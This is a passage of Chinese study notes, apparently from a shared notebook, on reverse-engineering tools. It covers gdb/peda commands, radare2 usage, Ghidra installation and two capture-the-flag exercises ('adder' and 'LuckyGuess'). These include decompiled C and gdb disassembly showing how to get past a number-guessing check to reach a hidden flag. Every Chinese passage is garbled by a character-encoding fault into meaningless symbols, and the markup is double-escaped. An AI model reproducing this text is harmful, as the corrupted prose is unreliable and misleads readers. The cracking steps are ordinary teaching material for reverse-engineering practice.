echo &amp;quot;source ~/peda/peda.py&amp;quot; &amp;gt;&amp;gt; ~/.gdbinit
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Êåá‰ª§Ë™™Êòé ‰æÜÊ∫ê==&amp;gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10257294&quot;&gt;ÈÄ£Áµê&lt;/a&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;help ( h )&lt;/code&gt;ÔºöÈ°ØÁ§∫Êåá‰ª§Á∞°Áü≠Ë™™Êòé„ÄÇ‰æãÔºöhelp breakpoint&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file&lt;/code&gt;ÔºöÈñãÂïüÊ™îÊ°à„ÄÇÁ≠âÂêåÊñº gdb filename&lt;/li&gt;
&lt;li&gt;&lt;code&gt;run&lt;/code&gt; ( r )ÔºöÂü∑Ë°åÁ®ãÂºèÔºåÊàñÊòØÂæûÈ†≠ÂÜçÂü∑Ë°åÁ®ãÂºè„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kill&lt;/code&gt;Ôºö‰∏≠Ê≠¢Á®ãÂºèÁöÑÂü∑Ë°å„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;backtrace ( bt )&lt;/code&gt;ÔºöÈ°ØÁ§∫Á®ãÂºèÂëºÂè´ÁöÑÂ†ÜÁñä(stack)„ÄÇ„ÄÇÊúÉÈ°ØÁ§∫Âá∫‰∏äÂ±§ÊâÄÊúâÁöÑ frame ÁöÑÁ∞°Áï•Ë≥áË®ä„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print ( p )&lt;/code&gt;ÔºöÂç∞Âá∫ËÆäÊï∏ÂÖßÂÆπ„ÄÇ‰æãÔºöprint iÔºåÂç∞Âá∫ËÆäÊï∏ i ÁöÑÂÖßÂÆπ„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;list ( l )&lt;/code&gt;ÔºöÂç∞Âá∫Á®ãÂºèÁ¢º„ÄÇËã•Âú®Á∑®Ë≠ØÊôÇÊ≤íÊúâÂä†‰∏ä -g ÂèÉÊï∏Ôºålist Êåá‰ª§Â∞áÁÑ°‰ΩúÁî®„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;whatis&lt;/code&gt;ÔºöÂç∞Âá∫ËÆäÊï∏ÁöÑÂûãÊÖã„ÄÇ‰æãÔºö whatis iÔºåÂç∞Âá∫ËÆäÊï∏ i ÁöÑÂûãÊÖã„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;breakpoint (b, bre, break)&lt;/code&gt;ÔºöË®≠ÂÆö‰∏≠Êñ∑Èªû
‰ΩøÁî® info breakpoint (info b) ‰æÜÊü•ÁúãÂ∑≤Ë®≠ÂÆö‰∫ÜÂì™‰∫õ‰∏≠Êñ∑Èªû„ÄÇ
Âú®Á®ãÂºèË¢´‰∏≠Êñ∑ÂæåÔºå‰ΩøÁî® info line ‰æÜÊü•ÁúãÊ≠£ÂÅúÂú®Âì™‰∏ÄË°å„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;continue (c, cont)&lt;/code&gt;ÔºöÁπºÁ∫åÂü∑Ë°å„ÄÇÂíå breakpoint Êê≠ÈÖç‰ΩøÁî®„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;frame&lt;/code&gt;ÔºöÈ°ØÁ§∫Ê≠£Âú®Âü∑Ë°åÁöÑË°åÊï∏„ÄÅÂâØÁ®ãÂºèÂêçÁ®±„ÄÅÂèäÂÖ∂ÊâÄÂÇ≥ÈÄÅÁöÑÂèÉÊï∏Á≠âÁ≠â frame Ë≥áË®ä„ÄÇ
frame 2ÔºöÁúãÂà∞ #2Ôºå‰πüÂ∞±ÊòØ‰∏ä‰∏ä‰∏ÄÂ±§ÁöÑ frame ÁöÑË≥áË®ä„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;next ( n )&lt;/code&gt;ÔºöÂñÆÊ≠•Âü∑Ë°åÔºå‰ΩÜÈÅáÂà∞ÂáΩÂºèÊôÇÊúÉÂ∞áÂëºÂè´ÁöÑÂáΩÂºè‰ΩúÁÇ∫‰∏ÄÂÄãË™ûÂè•Âü∑Ë°å„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;step ( s )&lt;/code&gt;ÔºöÂñÆÊ≠•Âü∑Ë°å„ÄÇ‰ΩÜÈÅáÂà∞ÂáΩÂºèÊôÇÊúÉÈÄ≤ÂÖ•ÂëºÂè´ÁöÑÂáΩÂºèÂü∑Ë°å„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;up&lt;/code&gt;ÔºöÁõ¥Êé•ÂõûÂà∞‰∏ä‰∏ÄÂ±§ÁöÑ frameÔºå‰∏¶È°ØÁ§∫ÂÖ∂ stack Ë≥áË®äÔºåÂ¶ÇÈÄ≤ÂÖ•ÈªûÂèäÂÇ≥ÂÖ•ÁöÑÂèÉÊï∏Á≠â„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;up 2&lt;/code&gt;ÔºöÁõ¥Êé•ÂõûÂà∞‰∏ä‰∏âÂ±§ÁöÑ frameÔºå‰∏¶È°ØÁ§∫ÂÖ∂ stack Ë≥áË®ä„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;down&lt;/code&gt;ÔºöÁõ¥Êé•Ë∑≥Âà∞‰∏ã‰∏ÄÂ±§ÁöÑ frameÔºå‰∏¶È°ØÁ§∫ÂÖ∂ stack Ë≥áË®ä„ÄÇ
ÂøÖÈ†à‰ΩøÁî® up ÂõûÂà∞‰∏äÂ±§ÁöÑ frame ÂæåÔºåÊâçËÉΩÁî® down ÂõûÂà∞Ë©≤Â±§‰æÜ„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;info&lt;/code&gt;ÔºöÈ°ØÁ§∫‰∏Ä‰∫õÁâπÂÆöÁöÑË≥áË®ä„ÄÇÂ¶ÇÔºö info breakÔºåÈ°ØÁ§∫‰∏≠Êñ∑ÈªûÔºå
info shareÔºåÈ°ØÁ§∫ÂÖ±‰∫´ÂáΩÂºèÂ∫´Ë≥áË®ä„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;disable&lt;/code&gt;ÔºöÊö´ÊôÇÈóúÈñâÊüêÂÄã breakpoint Êàñ display ‰πãÂäüËÉΩ„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;enable&lt;/code&gt;ÔºöÂ∞áË¢´ disable Êö´ÊôÇÈóúÈñâÁöÑÂäüËÉΩÂÜçÂïüÁî®„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;clear/delete&lt;/code&gt;ÔºöÂà™Èô§ÊüêÂÄã breakpoint„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;attach PID&lt;/code&gt;ÔºöËºâÂÖ•Â∑≤Âü∑Ë°å‰∏≠ÁöÑÁ®ãÂºè‰ª•ÈÄ≤Ë°åÈô§ÈåØ„ÄÇÂÖ∂‰∏≠ÁöÑ PID ÂèØÁî± ps Êåá‰ª§ÂèñÂæó„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;detach PID&lt;/code&gt;ÔºöÈáãÊîæÂ∑≤ attach ÁöÑÁ®ãÂºè„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shell&lt;/code&gt;ÔºöÂü∑Ë°å Shell Êåá‰ª§„ÄÇÂ¶ÇÔºöshell lsÔºåÂëºÂè´ sh ‰ª•Âü∑Ë°å ls Êåá‰ª§„ÄÇ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;quit&lt;/code&gt;ÔºöÈõ¢Èñã gdb„ÄÇÊàñÊòØÊåâ‰∏ã Ctrl+C ‰πüË°å„ÄÇ&lt;/li&gt;
&lt;li&gt;Êåâ‰∏ã&lt;code&gt;Enter&lt;/code&gt;ÔºöÁõ¥Êé•Âü∑Ë°å‰∏äÂÄãÊåá‰ª§&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Á§∫‰æã&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
void swap (int a, int b);
int main (void) {
  int i = 1234, j = 4321;
  printf (&amp;quot;i = %d, j = %d\n&amp;quot; , i, j);
  swap (i, j);
  printf (&amp;quot;i = %d, j = %d\n&amp;quot; , i, j);
  return 0;
}
void swap (int a, int b) {
  printf (&amp;quot;‰∫íÊèõÂâç:a = %d, b = %d\n&amp;quot; , a, b);
  int temp = a;
  a = b;
  b = temp;
  printf (&amp;quot;‰∫íÊèõÂæå:a = %d, b = %d\n&amp;quot; , a, b);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•Êåá‰ª§&lt;code&gt;gdb ./gdb_example&lt;/code&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJuVxG_ca.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Áï∂ÊàëÂÄëÂ∞áÁ¨¨7Ë°åÁµÇÊ≠¢ÔºåÂâá‰∫§Êèõ‰∏çÊúÉÁî¢Áîü&lt;ul&gt;
&lt;li&gt;Ëº∏ÂÖ•&lt;code&gt;b 7&lt;/code&gt;ÂæåÈÅãË°åÔºå&lt;code&gt;r&lt;/code&gt;ÁÇ∫ÈÅãË°å(run) &lt;img src=&quot;https://hackmd.io/_uploads/BkDZGf_cT.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;radare2ÊäÄË°ìÂØ¶Êà∞&lt;/h1&gt;
&lt;h2&gt;r2Áî®Ê≥ï&lt;/h2&gt;
&lt;h3&gt;1. Âú® Radare2 ‰∏≠ÊâìÈñãÊ™îÊ°à&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;r2 adder&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;2. ÂàÜÊûêÊ™îÊ°à&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;aaa #ÂàÜÊûêÊâÄÊúâ&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;3. ÂàóÂá∫ÂáΩÊï∏&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;afl          # ÂàóÂá∫ÊâÄÊúâÂáΩÊï∏&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;4. ÂèçÁµÑË≠ØÂíåÂàÜÊûêÂáΩÊï∏&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;pdf @ main   # ÂèçÁµÑË≠Ø main ÂáΩÊï∏&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;5. ‰ΩøÁî®Ë¶ñË¶∫Ê®°ÂºèÈÄ≤Ë°åÊõ¥Â•ΩÁöÑÂàÜÊûê&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;s main       # ÁßªÂãïÂà∞ main ÂáΩÊï∏ V            # ÈÄ≤ÂÖ•Ë¶ñË¶∫Ê®°Âºè&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Âú®Ë¶ñË¶∫Ê®°Âºè‰∏≠Ôºå‰ΩøÁî®ÁÆ≠È†≠ÈçµÊàñ HJKL ÈÄ≤Ë°åÂ∞éËà™„ÄÇ&lt;/li&gt;
&lt;li&gt;Êåâ &lt;code&gt;?&lt;/code&gt; Êü•ÁúãÈçµÁ∂ÅÂÆöÁöÑÂπ´Âä©„ÄÇ&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;6. ÈÄÄÂá∫ Radare2&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;q            # ÈÄÄÂá∫ Radare2&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;7. Âü∑Ë°åÂ§ñÈÉ®Êåá‰ª§Ôºà‰æãÂ¶Ç PythonÔºâ&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;!python3     # ÈñãÂïü Python3 shell&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÊÇ®ÂèØ‰ª•‰ΩøÁî®&lt;code&gt;!&lt;/code&gt; ‰æÜÂü∑Ë°åÂ§ñÈÉ®Êåá‰ª§(‰æãÂ¶Ç &lt;code&gt;!ls&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ê≥®ÊÑè&lt;/strong&gt;Ôºö&lt;ul&gt;
&lt;li&gt;‰ΩøÁî® &lt;code&gt;pd&lt;/code&gt; Âíå &lt;code&gt;pd $n_line&lt;/code&gt; ‰æÜÊâìÂç∞ÂèçÂΩôÁ∑®ÁöÑÊåá‰ª§„ÄÇ&lt;/li&gt;
&lt;li&gt;‰ΩøÁî® &lt;code&gt;s $function_name&lt;/code&gt; Êàñ &lt;code&gt;s $address&lt;/code&gt; ‰æÜÁßªÂãïÂà∞ÁâπÂÆöÁöÑÂú∞ÂùÄÊàñÂáΩÊï∏„ÄÇ&lt;/li&gt;
&lt;li&gt;Radare2 Êúâ‰∏âÁ®ÆÊ®°ÂºèÔºöCLI„ÄÅHex Mode Âíå Visual Mode„ÄÇ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;ÁØÑ‰æãÁ∑¥Áøí1 ==&amp;gt; RE/adder&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Áï∂ÊàëÂÄëÊ≠£Â∏∏Âü∑Ë°åÊôÇÔºåË©≤Âü∑Ë°åÊ™îËÆìÊàëÁåú3ÂÄãÊï∏Â≠óÔºåÂèØÊòØÊàëÊ≤íÁåúÂà∞&lt;img src=&quot;https://hackmd.io/_uploads/H1LuCG_qT.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ëº∏ÂÖ•&lt;code&gt;r2 add&lt;/code&gt;,ÂÜçËº∏ÂÖ•&lt;code&gt;aaa&lt;/code&gt;ÈÄ≤Ë°åÊ∑±ÂÖ•ÂàÜÊûê,ÁÇ∫‰∫ÜÊâæÂà∞&lt;code&gt;main&lt;/code&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJrh7m_qp.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ryNEW7dqa.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ëº∏ÂÖ•&lt;code&gt;pdf @ main&lt;/code&gt;ÈÄÜÂêëÂõûÂéª&lt;img src=&quot;https://hackmd.io/_uploads/rk-CQXu56.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ë¶ÅÈÄ≤ÂÖ•visualÊ®°ÂºèÔºåÂÖàÊâæÂà∞&lt;code&gt;main&lt;/code&gt;ÂáΩÂºèÔºå‰ΩøÁî®&lt;code&gt;s mian&lt;/code&gt;(s for seek),ÂÜçËº∏ÂÖ•&lt;code&gt;VV&lt;/code&gt;ÈÄ≤ÂÖ•visualÊ®°Âºè&lt;img src=&quot;https://hackmd.io/_uploads/BJiNwXdca.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BJ0sPQO9a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÂàÜÊûêture or false ÊâæÂ∞ãÈóúÈçµÈÉ®ÂàÜÔºåÂ¶ÇÂúñÔºåË©≤ÊèêÈ°ØÁ§∫ÁÇ∫1337&lt;img src=&quot;https://hackmd.io/_uploads/rJWdjmO5a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Á¢∫ÂØ¶ÊúâÊàêÂäü&lt;img src=&quot;https://hackmd.io/_uploads/rJbmhQd5p.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;ÁØÑ‰æãÁ∑¥Áøí2 ==&amp;gt; RE/LuckyGuess&lt;/h2&gt;
&lt;h3&gt;ÂÆâË£ù&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Áî±ÊñºË¶ÅÂÖàË£ùjavaÁöÑsdkÔºåËº∏ÂÖ•:&lt;code&gt;sudo apt-get install -y openjdk-17-jdk&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Á¢∫Ë™çjavaÁâàÊú¨&lt;img src=&quot;https://hackmd.io/_uploads/rJIdkHucp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;Ëº∏ÂÖ•&lt;code&gt;wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0.1_build/ghidra_11.0.1_PUBLIC_20240130.zip &lt;/code&gt;Â∞áÊ™îÊ°à‰∏ãËºâ‰∏ã‰æÜ&lt;/li&gt;
&lt;li&gt;Ëß£Â£ìÁ∏ÆÊ™îÊ°à&lt;code&gt;unzip ghidra_11.0.1_PUBLIC_20240130.zip &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ÈñãÂßãÂü∑Ë°å&lt;code&gt;./ghidraRun&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÈÄÜÂêë&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Â∞áLuckyGuess‰∏üÈÄ≤ÂéªÁÑ∂ÂæåÈñãÂßãÂàÜÊûê&lt;img src=&quot;https://hackmd.io/_uploads/HyyFdSd5p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÊâæÂà∞textÂü∑Ë°åÊ™î
&lt;img src=&quot;https://hackmd.io/_uploads/HkcQFrdcT.png&quot; alt=&quot;image&quot;&gt;&lt;ul&gt;
&lt;li&gt;ÂëàÁèæÈÄôÊ®£&lt;img src=&quot;https://hackmd.io/_uploads/BkbYFBu5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ÁÑ∂ÂæåË¶ÅÂà∞functionË£°ÊâæÂà∞mainÂáΩÊï∏&lt;img src=&quot;https://hackmd.io/_uploads/HkzJ5SO56.png&quot; alt=&quot;image&quot;&gt;&lt;ul&gt;
&lt;li&gt;ÊåñÂá∫‰æÜÂæåÈï∑ÈÄôÊ®£&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;undefined8 main(void)
{
  time_t tVar1;
  char *pcVar2;
  basic_ostream *pbVar3;
  long lVar4;
  undefined8 *puVar5;
  undefined8 *puVar6;
  byte bVar7;
  int local_a8;
  int local_a4;
  uint local_a0;
  int local_9c;
  undefined8 local_98 [18];

  bVar7 = 0;
  primp();
  puVar5 = &amp;amp;DAT_00400d80;
  puVar6 = local_98;
  for (lVar4 = 0x11; lVar4 != 0; lVar4 = lVar4 + -1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + (ulong)bVar7 * -2 + 1;
    puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
  }
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_9c = rand();
  local_9c = local_9c % 0x4000000;
  local_a4 = 0;
  local_a8 = 0;
  while( true ) {
    if (0x16 &amp;lt; local_a4) {
      local_a4 = local_a4 + 1;
      pbVar3 = std::operator&amp;lt;&amp;lt;((basic_ostream *)std::cout,&amp;quot;no dice.&amp;quot;);
      std::basic_ostream&amp;lt;&amp;gt;::operator&amp;lt;&amp;lt;((basic_ostream&amp;lt;&amp;gt; *)pbVar3,std::endl&amp;lt;&amp;gt;);
      return 0;
    }
    local_a4 = local_a4 + 1;
    std::operator&amp;lt;&amp;lt;((basic_ostream *)std::cout,&amp;quot;Guess? &amp;quot;);
    std::basic_istream&amp;lt;&amp;gt;::operator&amp;gt;&amp;gt;((basic_istream&amp;lt;&amp;gt; *)std::cin,&amp;amp;local_a8);
    if (local_a8 == local_9c) break;  //==ÈÄôÈÇäÂèØ‰ª•Áõ¥Êé•Ë∑≥Âá∫Ëø¥Âúà==
    if (local_a8 &amp;lt; local_9c) {
      pcVar2 = &amp;quot;lo&amp;quot;;
    }
    else {
      pcVar2 = &amp;quot;hi&amp;quot;;
    }
    pbVar3 = std::operator&amp;lt;&amp;lt;((basic_ostream *)std::cout,pcVar2);
    std::basic_ostream&amp;lt;&amp;gt;::operator&amp;lt;&amp;lt;((basic_ostream&amp;lt;&amp;gt; *)pbVar3,std::endl&amp;lt;&amp;gt;);
  }
  for (local_a0 = 0; local_a0 &amp;lt; 0x22; local_a0 = local_a0 + 1) {
    std::operator&amp;lt;&amp;lt;((basic_ostream *)std::cout,
                    (byte)*(undefined4 *)(c610 + (long)(int)local_a0 * 4) ^
                    (byte)*(undefined4 *)((long)local_98 + (long)(int)local_a0 * 4));
  }
  return 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Áü•ÈÅìÈÇèËºØË¶ÅË∑≥ËÑ´whileÔºåÁî®gdb&lt;img src=&quot;https://hackmd.io/_uploads/ryEDjBd96.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;ÂÖàÂèçÁµÑË≠Ø&lt;img src=&quot;https://hackmd.io/_uploads/B1c2JI_qa.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-=&quot;&gt;0x0000000000400af8 &amp;lt;+0&amp;gt;:	push   rbp
0x0000000000400af9 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
0x0000000000400afc &amp;lt;+4&amp;gt;:	sub    rsp,0xa0
0x0000000000400b03 &amp;lt;+11&amp;gt;:	call   0x400a7e &amp;lt;_Z5primpv&amp;gt;
0x0000000000400b08 &amp;lt;+16&amp;gt;:	lea    rdx,[rbp-0x90]
0x0000000000400b0f &amp;lt;+23&amp;gt;:	mov    esi,0x400d80
0x0000000000400b14 &amp;lt;+28&amp;gt;:	mov    eax,0x11
0x0000000000400b19 &amp;lt;+33&amp;gt;:	mov    rdi,rdx
0x0000000000400b1c &amp;lt;+36&amp;gt;:	mov    rcx,rax
0x0000000000400b1f &amp;lt;+39&amp;gt;:	rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
0x0000000000400b22 &amp;lt;+42&amp;gt;:	mov    edi,0x0
0x0000000000400b27 &amp;lt;+47&amp;gt;:	call   0x400930 &amp;lt;time@plt&amp;gt;
0x0000000000400b2c &amp;lt;+52&amp;gt;:	mov    edi,eax
0x0000000000400b2e &amp;lt;+54&amp;gt;:	call   0x4008f0 &amp;lt;srand@plt&amp;gt;
0x0000000000400b33 &amp;lt;+59&amp;gt;:	call   0x400920 &amp;lt;rand@plt&amp;gt;
0x0000000000400b38 &amp;lt;+64&amp;gt;:	cdq
0x0000000000400b39 &amp;lt;+65&amp;gt;:	shr    edx,0x6
0x0000000000400b3c &amp;lt;+68&amp;gt;:	add    eax,edx
0x0000000000400b3e &amp;lt;+70&amp;gt;:	and    eax,0x3ffffff
0x0000000000400b43 &amp;lt;+75&amp;gt;:	sub    eax,edx
0x0000000000400b45 &amp;lt;+77&amp;gt;:	mov    DWORD PTR [rbp-0x94],eax
0x0000000000400b4b &amp;lt;+83&amp;gt;:	mov    DWORD PTR [rbp-0x9c],0x0
0x0000000000400b55 &amp;lt;+93&amp;gt;:	mov    DWORD PTR [rbp-0xa0],0x0
0x0000000000400b5f &amp;lt;+103&amp;gt;:	jmp    0x400c27 &amp;lt;main+303&amp;gt;
0x0000000000400b64 &amp;lt;+108&amp;gt;:	mov    esi,0x400d60
0x0000000000400b69 &amp;lt;+113&amp;gt;:	mov    edi,0x6021c0
0x0000000000400b6e &amp;lt;+118&amp;gt;:	call   0x4008d0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
0x0000000000400b73 &amp;lt;+123&amp;gt;:	lea    rax,[rbp-0xa0]
0x0000000000400b7a &amp;lt;+130&amp;gt;:	mov    rsi,rax
0x0000000000400b7d &amp;lt;+133&amp;gt;:	mov    edi,0x6020a0
0x0000000000400b82 &amp;lt;+138&amp;gt;:	call   0x4008e0 &amp;lt;_ZNSirsERi@plt&amp;gt;
0x0000000000400b87 &amp;lt;+143&amp;gt;:	mov    eax,DWORD PTR [rbp-0xa0]
0x0000000000400b8d &amp;lt;+149&amp;gt;:	cmp    eax,DWORD PTR [rbp-0x94]
0x0000000000400b93 &amp;lt;+155&amp;gt;:	jne    0x400bf3 &amp;lt;main+251&amp;gt; //Êèê‰æõ‰∫ÜËÆäÊï∏Âú∞ÂùÄ
0x0000000000400b95 &amp;lt;+157&amp;gt;:	mov    DWORD PTR [rbp-0x98],0x0
0x0000000000400b9f &amp;lt;+167&amp;gt;:	jmp    0x400bd9 &amp;lt;main+225&amp;gt;
0x0000000000400ba1 &amp;lt;+169&amp;gt;:	mov    eax,DWORD PTR [rbp-0x98]
0x0000000000400ba7 &amp;lt;+175&amp;gt;:	cdqe
0x0000000000400ba9 &amp;lt;+177&amp;gt;:	mov    eax,DWORD PTR [rbp+rax*4-0x90]
0x0000000000400bb0 &amp;lt;+184&amp;gt;:	mov    edx,eax
0x0000000000400bb2 &amp;lt;+186&amp;gt;:	mov    eax,DWORD PTR [rbp-0x98]
0x0000000000400bb8 &amp;lt;+192&amp;gt;:	cdqe
0x0000000000400bba &amp;lt;+194&amp;gt;:	mov    eax,DWORD PTR [rax*4+0x602300]
0x0000000000400bc1 &amp;lt;+201&amp;gt;:	xor    eax,edx
0x0000000000400bc3 &amp;lt;+203&amp;gt;:	movsx  eax,al
0x0000000000400bc6 &amp;lt;+206&amp;gt;:	mov    esi,eax
0x0000000000400bc8 &amp;lt;+208&amp;gt;:	mov    edi,0x6021c0
0x0000000000400bcd &amp;lt;+213&amp;gt;:	call   0x4008b0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_c@plt&amp;gt;
0x0000000000400bd2 &amp;lt;+218&amp;gt;:	add    DWORD PTR [rbp-0x98],0x1
0x0000000000400bd9 &amp;lt;+225&amp;gt;:	mov    eax,DWORD PTR [rbp-0x98]
0x0000000000400bdf &amp;lt;+231&amp;gt;:	movsxd rdx,eax
0x0000000000400be2 &amp;lt;+234&amp;gt;:	mov    eax,0x22
0x0000000000400be7 &amp;lt;+239&amp;gt;:	cmp    rdx,rax
0x0000000000400bea &amp;lt;+242&amp;gt;:	jb     0x400ba1 &amp;lt;main+169&amp;gt;
0x0000000000400bec &amp;lt;+244&amp;gt;:	mov    eax,0x1
0x0000000000400bf1 &amp;lt;+249&amp;gt;:	jmp    0x400c65 &amp;lt;main+365&amp;gt;
0x0000000000400bf3 &amp;lt;+251&amp;gt;:	mov    eax,DWORD PTR [rbp-0xa0]
0x0000000000400bf9 &amp;lt;+257&amp;gt;:	cmp    eax,DWORD PTR [rbp-0x94]
0x0000000000400bff &amp;lt;+263&amp;gt;:	jge    0x400c08 &amp;lt;main+272&amp;gt;
0x0000000000400c01 &amp;lt;+265&amp;gt;:	mov    eax,0x400d68
0x0000000000400c06 &amp;lt;+270&amp;gt;:	jmp    0x400c0d &amp;lt;main+277&amp;gt;
0x0000000000400c08 &amp;lt;+272&amp;gt;:	mov    eax,0x400d6b
0x0000000000400c0d &amp;lt;+277&amp;gt;:	mov    rsi,rax
0x0000000000400c10 &amp;lt;+280&amp;gt;:	mov    edi,0x6021c0
0x0000000000400c15 &amp;lt;+285&amp;gt;:	call   0x4008d0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
0x0000000000400c1a &amp;lt;+290&amp;gt;:	mov    esi,0x400910
0x0000000000400c1f &amp;lt;+295&amp;gt;:	mov    rdi,rax
0x0000000000400c22 &amp;lt;+298&amp;gt;:	call   0x400900 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
0x0000000000400c27 &amp;lt;+303&amp;gt;:	mov    eax,DWORD PTR [rbp-0x9c]
0x0000000000400c2d &amp;lt;+309&amp;gt;:	lea    edx,[rax+0x1]
0x0000000000400c30 &amp;lt;+312&amp;gt;:	mov    DWORD PTR [rbp-0x9c],edx
0x0000000000400c36 &amp;lt;+318&amp;gt;:	cmp    eax,0x16
0x0000000000400c39 &amp;lt;+321&amp;gt;:	setle  al
0x0000000000400c3c &amp;lt;+324&amp;gt;:	test   al,al
0x0000000000400c3e &amp;lt;+326&amp;gt;:	jne    0x400b64 &amp;lt;main+108&amp;gt;
0x0000000000400c44 &amp;lt;+332&amp;gt;:	mov    esi,0x400d6e
0x0000000000400c49 &amp;lt;+337&amp;gt;:	mov    edi,0x6021c0
0x0000000000400c4e &amp;lt;+342&amp;gt;:	call   0x4008d0 &amp;lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&amp;gt;
0x0000000000400c53 &amp;lt;+347&amp;gt;:	mov    esi,0x400910
0x0000000000400c58 &amp;lt;+352&amp;gt;:	mov    rdi,rax
0x0000000000400c5b &amp;lt;+355&amp;gt;:	call   0x400900 &amp;lt;_ZNSolsEPFRSoS_E@plt&amp;gt;
0x0000000000400c60 &amp;lt;+360&amp;gt;:	mov    eax,0x0
0x0000000000400c65 &amp;lt;+365&amp;gt;:	leave
